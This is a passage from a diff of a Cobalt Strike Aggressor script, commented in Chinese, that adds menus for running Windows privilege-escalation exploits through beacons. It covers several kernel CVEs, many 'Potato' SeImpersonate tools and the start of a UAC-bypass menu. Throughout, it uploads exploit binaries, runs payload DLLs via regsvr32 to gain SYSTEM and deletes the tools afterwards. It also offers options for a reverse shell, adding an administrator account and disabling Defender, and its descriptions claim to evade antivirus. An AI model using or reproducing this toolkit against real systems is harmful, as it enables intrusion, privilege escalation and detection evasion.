+                bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2022-21882.exe"));
+                fireAlias($bid, "sharpcmd", "\"CVE-2022-21882 $3['command']\"");
+                # https://github.com/David-Honisch/CVE-2022-21882
+            }
+            if ($3['options'] eq "mem-who") {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2022-21882-whoami.dotnet.exe"));
+            }
+            if ($3['options'] eq "mem-cmd") {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2022-21882-runcmd.dotnet.exe"));
+            }
+        }
+        item "CVE-2023-36802*" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2023-36802",%(command => "whoami",bid => $bid),&CVE-2023-36802);
+            dialog_description($dialog, "Microsoft流式处理代理权限提升漏洞，Win11 20H2、Win2019/2022成功，Win10会蓝屏，其他系统自测。");
+            drow_combobox($dialog, "version", "support: ", @("Win11/Win2k19/2022"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2023-36802 {
+            btask($bid, "Tasked beacon upload and run: CVE-2023-36802");
+            bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2023-36802.x64.exe"));
+            fireAlias($bid, "sharpcmd", "\"CVE-2023-36802.x64.exe $3['command']\"");
+        }
+        item "CVE-2024-21338" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2024-21338",%(bid => $bid),&CVE-2024-21338);
+            dialog_description($dialog, "Windows内核提权漏洞，默认执行当前目录下的cmd.exe，利用条件：启用内存完整性（HVCI），启用该功能要在BIOS开启虚拟化。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win11"));
+            drow_combobox($dialog, "options", "options: ", @("1","2"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2024-21338 {
+            local('$0x360 $0x4b8 $winbuild');
+            btask($bid, "Tasked beacon upload and run: CVE-2024-21338");
+            $0x360 =  script_resource("bin/escalation/OtherExps/CVE-2024-21338-0x360.exe");
+            $0x4b8 =  script_resource("bin/escalation/OtherExps/CVE-2024-21338-0x4b8.exe");
+
+            $winbuild = binfo($bid, "build");
+            blog($bid, "Current Windows OS Build: $winbuild");
+
+            if ($winbuild != '9200' && $winbuild != '9600' && $winbuild != '17763' && $winbuild != '18362' && $winbuild != '18363' && $winbuild != '19041' && $winbuild != '19042' && $winbuild != '19043' && $winbuild != '19044' && $winbuild != '19045' && $winbuild != '22000' && $winbuild != '22621' && $winbuild != '22631') {
+                berror($bid, "This exploit only supports Windows 10 And Windows 11 Series System");
+                return;
+            }
+
+            if ($winbuild != '17763' && $winbuild != '18362' && $winbuild != '18363') {
+                bupload!($bid, $0x4b8);
+                fireAlias($bid, "sharpcmd", "\"CVE-2024-21338-0x4b8 $3['options']\"");
+            } else {
+                bupload!($bid, $0x360);
+                fireAlias($bid, "sharpcmd", "\"CVE-2024-21338-0x360 $3['options']\"");
+            }
+            # https://github.com/tykawaii98/CVE-2024-21338_PoC
+        }
+        item "CVE-2024-26229" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2024-26229",%(bid => $bid),&CVE-2024-26229);
+            dialog_description($dialog, "Windows CSC服务特权提升漏洞，csc.sys驱动程序中带有METHOD_NEITHER I/O控制代码的IOCTL地址验证不正确。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win11"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2024-26229 {
+            local('$handle $data $0x360 $0x4b8 $winbuild');
+            btask($bid, "Tasked beacon to inline-execute: CVE-2024-26229");
+            $0x360 =  script_resource("bin/escalation/OtherExps/CVE-2024-26229-0x360.o");
+            $0x4b8 =  script_resource("bin/escalation/OtherExps/CVE-2024-26229-0x4b8.o");
+
+            $winbuild = binfo($bid, "build");
+            blog($bid, "Current Windows OS Build: $winbuild");
+            blog($bid, "Vulnerable system version Win10/11 1909/20H2/21H2/22H2/23H2");
+
+            if ($winbuild != '9200' && $winbuild != '9600' && $winbuild != '17763' && $winbuild != '18362' && $winbuild != '18363' && $winbuild != '19041' && $winbuild != '19042' && $winbuild != '19043' && $winbuild != '19044' && $winbuild != '19045' && $winbuild != '22000' && $winbuild != '22621' && $winbuild != '22631') {
+                berror($bid, "This exploit only supports Windows 10 And Windows 11 Series System");
+                return;
+            }
+
+            if ($winbuild != '17763' && $winbuild != '18362' && $winbuild != '18363') {
+                blog($bid,$0x4b8);
+                $handle = openf($0x4b8);
+                $data   = readb($handle, -1);
+                closef($handle);
+                beacon_inline_execute($bid, $data, "go");
+                bgetuid($bid);
+            } else {
+                blog($bid,$0x360);
+                $handle = openf($0x360);
+                $data   = readb($handle, -1);
+                closef($handle);
+                beacon_inline_execute($bid, $data, "go");
+                bgetuid($bid);
+            }
+            # https://github.com/NVISOsecurity/CVE-2024-26229-BOF
+            # https://github.com/apkc/CVE-2024-26229-BOF
+        }
+        item "CVE-2024-30088" {
+            $bid = $1['@'];
+            $dialog = dialog("CVE-2024-30088",%(program => "C:\\ProgramData\\artifact.exe",bid => $bid),&CVE-2024-30088);
+            dialog_description($dialog, "Windows内核特权提升漏洞，该利用程序允许我们以SYSTEM权限执行指定程序，不过利用过程有些慢！");
+            drow_combobox($dialog, "version", "support: ", @("Win10/11/Win2k16/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","mem-cmd"));
+            drow_text($dialog, "program", "program: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CVE-2024-30088 {
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: CVE-2024-30088");
+                bupload!($bid, script_resource("bin/escalation/OtherExps/CVE-2024-30088.exe"));
+                fireAlias($bid, "sharpcmd", "\"CVE-2024-30088.exe $3['program']\"");
+                # https://github.com/tykawaii98/CVE-2024-30088
+            } else {
+                bexecute_assembly($bid, script_resource("bin/escalation/OtherExps/PEzor/CVE-2024-30088-runcmd.dotnet.exe"));
+            }
+        }
+    }
+
+    menu "PotatoExps"  {
+        item "BadPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("BadPotato",%(command => "whoami",bid => $bid),&BadPotato);
+            dialog_description($dialog, "哥斯拉作者BeichenDream贡献的.Net版本pipePotato，已在Windows 2012-2019、Windows 8-10全补丁测试成功。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k12/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub BadPotato {
+            local('$exe $dllname $payload');
+            $exe = script_resource("bin/escalation/PotatoExps/BadPotato.exe");
+
+            if ($3['options'] eq "command") {
+                bexecute_assembly($bid, $exe, "\"$3['command']\"");
+                # https://github.com/BeichenDream/BadPotato
+            } else {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via BadPotato");
+                $dllname = Getname().".dll";
+                $payload = artifact_payload($3['listener'], "dll", barch($bid));
+                bupload_raw!($bid, $dllname, $payload);
+                btask($bid, "Stageless uploading to: $dllname");
+                bexecute_assembly($bid, $exe, "\"regsvr32 $dllname\"");
+                # 以下写入方式会在CS客户端同时生成dll
+                # $handle = openf("> $+ $dllname");
+                # writeb($handle, $payload);
+                # closef($handle);
+                # bupload!($bid, $dllname);
+            }
+        }
+
+        item "EfsPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("EfsPotato",%(command => "whoami",bid => $bid),&EfsPotato);
+            dialog_description($dialog, "利用EfsPotato（有SeImpersonatePrivilege本地权限升级漏洞的MS-EFSR EfsRpcEncryptFileSrv）提权。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_combobox($dialog, "type", "pipe: ", @("lsarpc","efsrpc","samr","lsass","netlogon"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub EfsPotato {         # NET2.0编译的exp在部分Win10/Win2k22可能会报错5（已修复，NET4.x编译），也可尝试使用线程土豆进行提权
+            local('$exe1 $exe2 $shellcode');
+            $exe1 = script_resource("bin/escalation/PotatoExps/EfsPotato.exe");
+            $exe2 = script_resource("bin/escalation/PotatoExps/EfsPotato_s.exe");
+            
+            if ($3['options'] eq "command") {   # 该exp在Win2k8执行可能会报错：[-] Invoke_3 on EntryPoint failed.（.NET4编译问题），可用下边这个exp
+                bexecute_assembly($bid, $exe1, "\"$3['command']\" $3['type']");
+                # https://github.com/zcgonvh/EfsPotato
+            } else {    # 该exp在Win10/Win2k22执行可能会报错：[x] EfsRpcOpenFileRaw failed：5（BUG问题），实战中遇到这种情况时可以使用线程土豆进行提权
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via EfsPotato");
+                $shellcode = base64_encode(artifact_payload($3['listener'], "raw", "x64"));
+                bexecute_assembly!($bid, $exe2, $shellcode);
+                # https://github.com/0neAtSec/EfsPotato-1
+            }
+        }
+
+        item "GodPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("GodPotato",%(command => "whoami",bid => $bid),&GodPotato);
+            dialog_description($dialog, "rpcss在处理ox时存在一些缺陷，而rpcss是系统必须开启的服务，影响版本：Windows Server 2012 - Windows Server 2022、Windows8 - Windows 11，Win2k12/2016失败。");
+            drow_listener_stage($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/11/Win2k16/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub GodPotato {         # Win2k16本地复现失败，但有朋友实战成功过
+            local('$exe $dllname $payload');
+            $exe = script_resource("bin/escalation/PotatoExps/GodPotato.exe");
+
+            if ($3['options'] eq "command") {
+                bexecute_assembly($bid, $exe, "-cmd \"$3['command']\"");
+                # https://github.com/BeichenDream/GodPotato
+            } else {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via GodPotato");
+                $dllname = Getname().".dll";
+                $payload = artifact_payload($3['listener'], "dll", barch($bid));
+                bupload_raw!($bid, $dllname, $payload);
+                btask($bid, "Stageless uploading to: $dllname");
+                bexecute_assembly($bid, $exe, "-cmd \"regsvr32 $dllname\"");
+            }
+        }
+
+        item "PetitPotam" {
+            $bid = $1['@'];
+            $dialog = dialog("PetitPotam",%(command => "whoami",bid => $bid),&PetitPotam);
+            dialog_description($dialog, "PetitPotam，Win10/Win2k8/2012/2019系统已在本地复现成功，其他系统在实战中自行测试。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2019"));
+            drow_combobox($dialog, "options", "options: ", @("command","mem-who","mem-cmd"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub PetitPotam {
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: PetitPotam");
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/PetitPotam.exe"));
+                bshell($bid, "PetitPotam \"$3['command']\"");
+                brm($bid, "PetitPotam.exe");
+                # https://github.com/BeichenDream/PetitPotam
+            }
+            if ($3['options'] eq "mem-who") {
+                bexecute_assembly($bid, script_resource("bin/escalation/PotatoExps/PetitPotam-whoami.dotnet.exe"));
+            }
+            if ($3['options'] eq "mem-cmd") {
+                bexecute_assembly($bid, script_resource("bin/escalation/PotatoExps/PetitPotam-runcmd.dotnet.exe"));
+            }
+        }
+
+        item "PetitPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("PetitPotato",%(EfsID => "3",command => "whoami",bid => $bid),&PetitPotato);
+            dialog_description($dialog, "通过SeImpersonate特权进行本地权限升级，EfsID：0-12，仅测试了Win10/Win2k12/2019/2022；shellcode上线需将command改为可读写路径用于上传dll文件。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k12/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode","mem-cmd"));
+            drow_text($dialog, "EfsID", "EfsID: ");
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub PetitPotato {
+            local('$exe $dllname $payload');
+            $exe = script_resource("bin/escalation/PotatoExps/PetitPotato.exe");
+
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: PetitPotato");
+                bupload!($bid, $exe);
+                fireAlias($bid, "sharpcmd", "\"PetitPotato $3['EfsID'] $3['command']\"");
+                # bshell($bid, "PetitPotato $3['EfsID'] \"$3['command']\"");
+                # bshell($bid, "del /f /s /q PetitPotato.exe");     # 需手动删除这个利用工具
+                # https://github.com/wh0amitz/PetitPotato
+            }
+            if ($3['options'] eq "shellcode") {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via PetitPotato");
+                $dllname = "$3['command'] $+ \\" . Getname() . ".dll";   # 需填写dll木马绝对路径
+                $payload = artifact_payload($3['listener'], "dll", barch($bid));
+                bupload_raw!($bid, $dllname, $payload);
+                btask($bid, "Stageless uploading to: $dllname");
+                bupload!($bid, $exe);
+                bshell($bid, "PetitPotato $3['EfsID'] \"regsvr32 $dllname\"");  # sharpcmd执行有点问题
+                bshell($bid, "taskkill /f /im PetitPotato.exe");
+                bshell($bid, "del /f /s /q PetitPotato.exe");
+            }
+            if ($3['options'] eq "mem-cmd") {
+                bexecute_assembly($bid, script_resource("bin/escalation/PotatoExps/PetitPotato-runcmd.dotnet.exe"));
+            }
+        }
+
+        item "DeadPotato" {     # Win2k16本地复现失败，但有朋友实战成功过
+            $bid = $1['@'];
+            $dialog = dialog("DeadPotato",%(command => "whoami",resever => "192.168.1.120:9527",adduser => "Adminlstrator:P@ssw0rd!@#",bid => $bid),&DeadPotato);
+            dialog_description($dialog, "DeadPotato是由BeichenDream根据原始GodPotato源代码定制而成的一个特权提升工具，利用 SeImpersonate权限获取SYSTEM特权。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/11/Win2k16/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("-cmd","-exe","-rev","-newadmin","-defender"));
+            drow_text($dialog, "command", "cmd/exe: ");
+            drow_text($dialog, "resever", "host:port: ");
+            drow_text($dialog, "adduser", "user:pass: ");
+            drow_combobox($dialog, "defender", "defender: ", @("off","on"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub DeadPotato {
+            local('$exe');
+            $exe = script_resource("bin/escalation/PotatoExps/DeadPotato.exe");
+
+            if ($3['options'] eq "-cmd") {
+                bexecute_assembly($bid, $exe, "-cmd \"$3['command']\"");
+                # https://github.com/lypd0/DeadPotato
+            } 
+            if ($3['options'] eq "-exe") {
+                bexecute_assembly($bid, $exe, "-exe \"$3['command']\"");
+            }
+            if ($3['options'] eq "-rev") {
+                bexecute_assembly($bid, $exe, "-rev $3['resever']");
+            }
+            if ($3['options'] eq "-newadmin") {
+                bexecute_assembly($bid, $exe, "-newadmin $3['adduser']");
+            }
+            if ($3['options'] eq "-defender") {
+                bexecute_assembly($bid, $exe, "-defender $3['defender']");
+            }
+        }
+
+        item "RottenPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("RottenPotato",%(program => "C:\\Windows\\System32\\calc.exe", command => "whoami",bid => $bid),&RottenPotato);
+            dialog_description($dialog, "RottenPotato反射DLL，仅测试了Win2K8/12/16，但在执行命令时无回显（可以执行文件上线）。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win2k8/2012/2016"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_text($dialog, "program", "program: ");
+            # drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub RottenPotato {
+            local('$exe $arch $dll $stager');
+            $exe = script_resource("bin/escalation/PotatoExps/RottenPotato.exe");
+            
+            if (-is64 $bid) {
+                $arch = "x64";
+                $dll =  script_resource("bin/escalation/PotatoExps/RottenPotato.x64.dll");
+            } else {
+                $arch = "x86";
+                $dll =  script_resource("bin/escalation/PotatoExps/RottenPotato.x86.dll");
+            }
+
+            if ($3['options'] eq "command") {
+                bexecute_assembly($bid, $exe, "\"$3['program']\"");     # 执行命令无回显
+                # bexecute_assembly($bid, $exe, "\"$3['program']\" \"/c $3['command']\"");
+                # https://github.com/foxglovesec/RottenPotato
+            } else {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via RottenPotato (ms16-075)");
+                $stager = shellcode($3['listener'], false, $arch);
+                bdllspawn($bid, $dll, $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+                beacon_link($bid, $null, $3['listener']); 
+                # https://github.com/johnjohnsp1/reflectivepotato
+            }
+        }
+
+        item "JuicyPotato"{
+            $bid = $1['@'];
+            $dialog = dialog("JuicyPotato",%(clsid => "854A20FB-2D44-457D-992F-EF13785D2B51", program => "C:\\Windows\\System32\\calc.exe", command => "whoami", bid => $bid),&JuicyPotato);
+            dialog_description($dialog, "滥用SeImpersonatePrivilege特权，JuicyPotatoNG是另一个从服务帐户到SYSTEM方法，Win2k12执行命令时无任何回显（可以执行文件上线）。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_text($dialog, "clsid", "CLSID: ");
+            drow_text($dialog, "program", "program: ");
+            # drow_text($dialog, "command", "command: ");   # 执行命令无回显
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub JuicyPotato {
+            local('$arch $dll $stager');
+
+            if (-is64 $bid)
+            {
+                $arch = "x64";
+                $dll = script_resource("bin/escalation/PotatoExps/JuicyPotato.x64.dll");
+            } else {
+                $arch = "x86";
+                $dll = script_resource("bin/escalation/PotatoExps/JuicyPotato.x86.dll");
+            }
+
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: JuicyPotatoNG");
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/JuicyPotatoNG.exe"));
+                fireAlias($bid, "sharpcmd", "\"JuicyPotatoNG -t * -l 1337 -c \{$3['clsid']\} -p $3['program']\"");
+                # bshell($bid, "JuicyPotatoNG -t * -l 1337 -c \{$3['clsid']\} -p $3['program'] -a \"/c $3['command']\"");
+                bshell($bid, "del /f /s /q JuicyPotatoNG.exe");
+                # https://github.com/antonioCoco/JuicyPotatoNG
+            } else {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via JuicyPotato (ms16-075)");
+                $stager = shellcode($3['listener'], false, $arch);
+                bdllspawn!($bid, $dll, $stager, "NTLM DCOM->RPC NTLM Reflection (MS16-075)", 5000);
+                beacon_link($bid, $null, $3['listener']); 
+                # https://github.com/ohpe/juicy-potato
+            }
+        }
+
+        item "SweetPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("SweetPotato",%(clsid => "4991D34B-80A1-4291-83B6-3328366B9097", program => "C:\\Windows\\System32\\cmd.exe", command => "whoami", bid => $bid),&SweetPotato);
+            dialog_description($dialog, "从Windows 7到Windows 10/Server 2019的本地服务到系统权限升级。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k8/2012/2016"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode","msbuild-s"));
+            drow_text($dialog, "clsid", "CLSID: ");
+            drow_text($dialog, "program", "program: ");
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub SweetPotato {
+            local('$program $msbuild $arg $shellcode');
+            # $cmdshell = "C:\\windows\\system32\\cmd.exe";
+            $program = "C:\\windows\\system32\\werfault.exe";
+            $msbuild = "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe";
+
+            if ($3['options'] eq "command") {
+                $arg = "-c $3['clsid'] "."-p $3['program'] "."-a \"/c $3['command']\"";
+                bexecute_assembly($bid, script_resource("bin/escalation/PotatoExps/SweetPotato.exe"), $arg);
+                # https://github.com/uknowsec/SweetPotato
+            }
+            if ($3['options'] eq "shellcode") {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via SweetPotato (ms16-075)");
+                # $shellcode = base64_encode(payload($3['listener'], barch($bid)));
+                $shellcode = base64_encode(artifact_payload($3['listener'], "raw", barch($bid)));
+                $arg = "-c $3['clsid'] "."-l 6363 "."-p $program "."-s $shellcode";
+                bexecute_assembly!($bid, script_resource("bin/escalation/PotatoExps/SweetPotato_s.exe"), $arg);
+                beacon_link($bid, $null, $3['listener']);
+            }
+            if ($3['options'] eq "msbuild-s") {
+                $arg = "-c $3['clsid'] "."-p $msbuild "."-a \"$3['command']\"";
+                bexecute_assembly($bid, script_resource("bin/escalation/PotatoExps/SweetPotato.exe"), $arg);
+            }
+        }
+
+        item "SigmaPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("SigmaPotato",%(command => "whoami",bid => $bid),&SigmaPotato);
+            dialog_description($dialog, "GodPotato衍生品，适用于Windows 8-11和Windows Server 2012-2022的SeImpersonate权限提升工具。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/11/Win2k19/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub SigmaPotato {
+            local('$exe $dllname $payload');
+            $exe = script_resource("bin/escalation/PotatoExps/SigmaPotato.exe");
+
+            if ($3['options'] eq "command") {
+                bexecute_assembly($bid, $exe, "\"$3['command']\"");
+                # https://github.com/tylerdotrar/SigmaPotato
+            } else {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via SigmaPotato");
+                $dllname = Getname().".dll";
+                $payload = artifact_payload($3['listener'], "dll", barch($bid));
+                bupload_raw!($bid, $dllname, $payload);
+                btask($bid, "Stageless uploading to: $dllname");
+                bexecute_assembly($bid, $exe, "\"regsvr32 $dllname\"");
+            }
+        }
+
+        item "DCOMPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("DCOMPotato",%(command => "whoami",bid => $bid),&DCOMPotato);
+            dialog_description($dialog, "基于某些指定服务的DCOM对象和SeImpersonate特权获取SYSTEM权限（360进程防护会拦截）；shellcode上线需将command修改为可读写路径用于上传dll文件。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/11/Win2k12/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_combobox($dialog, "type", "exploits: ", @("PrinterNotifyPotato","McpManagementPotato"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub DCOMPotato {        # McpManagement仅支持Win11/2022，PrinterNotify支持Win10/Win2k12/2019/2022
+            local('$exe $dllname $payload');
+            $exe = script_resource("bin/escalation/PotatoExps/"."$3['type']".".exe");
+
+            if ($3['options'] eq "command") {
+                bexecute_assembly($bid, $exe, "\"$3['command']\"");
+                # https://github.com/zcgonvh/DCOMPotato
+            } else {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via $3['type']");
+                $dllname = "$3['command'] $+ \\" . Getname() . ".dll";   # 需填写dll木马绝对路径
+                $payload = artifact_payload($3['listener'], "dll", barch($bid));
+                bupload_raw!($bid, $dllname, $payload);
+                btask($bid, "Stageless uploading to: $dllname");
+                bexecute_assembly($bid, $exe, "\"regsvr32 $dllname\""); 
+            }
+        }
+
+        item "DCOMPotato[BOF]" {
+            $bid = $1['@'];
+            $dialog = dialog("DCOMPotato[BOF]",%(pprog => "C:\\Windows\\System32\\cmd.exe", pargs => "whoami>result.txt", pmode => "2", bid => $bid),&DCOMPotato_BOF);
+            dialog_description($dialog, "≤CS4.5无法使用；通过将恶意IUnknwon对象传递给PrintNotify的DCOM调用，以SeImpersonate特权获取SYSTEM。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k12/2019/2022"));
+            drow_text($dialog, "pprog", "pprog: ");
+            drow_text($dialog, "pargs", "pargs: ");
+            drow_combobox($dialog, "pmode", "pmode: ", @("1","2","3"));
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub DCOMPotato_BOF {    # w3wp.exe进程下执行会报错，改用其他进程
+            btask($bid, "Tasked beacon run: DCOMPotato [BOF]");
+            # https://github.com/Hagrid29/BOF-DCOMPotato-PrintNotify
+
+            if ($3['pmode'] eq "3") {
+                fireAlias($bid, "DCOMPotato", "--pmode 3");
+            } else {
+                fireAlias($bid, "DCOMPotato", "--pprog $3['pprog'] --pargs \"/c $3['pargs']\" --pmode $3['pmode']");
+            } 
+        }
+
+        item "CoercedPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("CoercedPotato",%(command => "whoami",bid => $bid),&CoercedPotato);
+            dialog_description($dialog, "使用SeImpersonateToken权限和MS-RPRN函数将权限从NT Service升级到SYSTEM；使用Reflective上线时需将command修改为CS/MSF木马绝对路径。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/11/Win2k19/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","Reflective"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub CoercedPotato {     # 作者说支持Windows 11，但本地测试没成功
+            local('$dll $args1 $args2 $args3');
+            $dll = script_resource("bin/escalation/PotatoExps/CoercedPotato.dll");
+            $args1 = "spawn ProcessToSpawn OptionalCmdArgument";
+            $args2 = "spawn $3['command']";
+            $args3 = "coerce";
+
+            if ($3['options'] eq "command") {
+                btask($bid, "Tasked beacon upload and run: CoercedPotato");
+                btask($bid, "upload: msvcp140、vcruntime140、vcruntime140_1、CoercedPotato");
+                # 有的新装Winodws 10可能缺少这3个dll文件，需要上传后才能执行CoercedPotato.exe
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/CoercedPotato/msvcp140.dll"));
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/CoercedPotato/vcruntime140.dll"));
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/CoercedPotato/vcruntime140_1.dll"));
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/CoercedPotato.exe"));
+                fireAlias($bid, "sharpcmd", "\"CoercedPotato -c $3['command']\"");
+                bshell!($bid, "taskkill /f /im CoercedPotato.exe");
+                bshell!($bid, "del /f /s /q CoercedPotato.exe msvcp140.dll vcruntime140.dll vcruntime140_1.dll");
+                # https://github.com/Prepouce/CoercedPotato
+            }
+            if ($3['options'] eq "Reflective") {
+                # 这个提权EXP有点问题，两台Win10，一个成功，一个失败（无回显），需指定木马路径
+                btask($bid, "Tasked beacon run: CoercedPotato [Reflective DLL]");
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/CoercedPotato/msvcp140.dll"));
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/CoercedPotato/vcruntime140.dll"));
+                bupload!($bid, script_resource("bin/escalation/PotatoExps/CoercedPotato/vcruntime140_1.dll"));
+                bdllspawn($bid, $dll, $args1, "ProcessToSpawn OptionalCmdArgument", 5000, false);
+                bdllspawn($bid, $dll, $args2, "$3['command']", 5000, false);
+                bdllspawn($bid, $dll, $args3, "coerce", 5000, false);
+                bshell!($bid, "del /f /s /q msvcp140.dll vcruntime140.dll vcruntime140_1.dll");
+                # https://github.com/sokaRepo/CoercedPotatoRDLL
+            }
+        }
+
+        item "PrintNotifyPotato" {
+            $bid = $1['@'];
+            $dialog = dialog("PrintNotifyPotato",%(command => "whoami",bid => $bid),&PrintNotifyPotato);
+            dialog_description($dialog, "PrintNotifyPotato利用PrintNotify COM服务进行提权，支持Windows Server 2012-2022、Windows 10-11。");
+            drow_listener($dialog, "listener", "listener: ");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win2k12/2016/2019/2022"));
+            drow_combobox($dialog, "options", "options: ", @("command","shellcode"));
+            drow_text($dialog, "command", "command: ");
+            dbutton_action($dialog, "确定");
+            dialog_show($dialog);
+        }
+        sub PrintNotifyPotato { # Win2k16本地复现失败，但有朋友实战成功过
+            local('$exe $dllname $payload');
+            $exe = script_resource("bin/escalation/PotatoExps/PrintNotifyPotato.exe");
+
+            if ($3['options'] eq "command") {
+                bexecute_assembly($bid, $exe, "\"$3['command']\"");
+                # https://github.com/BeichenDream/PrintNotifyPotato
+            } else {
+                btask($bid, "Task Beacon to run " . listener_describe($3['listener']) . " via PrintNotifyPotato");
+                $dllname = Getname().".dll";
+                $payload = artifact_payload($3['listener'], "dll", barch($bid));
+                bupload_raw!($bid, $dllname, $payload);
+                btask($bid, "Stageless uploading to: $dllname");
+                bexecute_assembly($bid, $exe, "\"regsvr32 $dllname\"");
+            }
+        }
+    }
+
+    menu "BypassUAC" {
+        item "UAC-Bonanza" {
+            $bid = $1['@'];
+            $dialog = dialog("UAC-Bonanza",%(program => "C:\\Windows\\System32\\calc.exe",bid => $bid),&UACBonanza);
+            dialog_description($dialog, "UAC绕过技术集合，有BOF、EXE两个版本，BOF有问题，暂时用EXE，目前可过360、火绒、WDF静态检测，RegistryShellCommand可过360拦截。");
+            drow_combobox($dialog, "version", "support: ", @("Win10/Win11"));
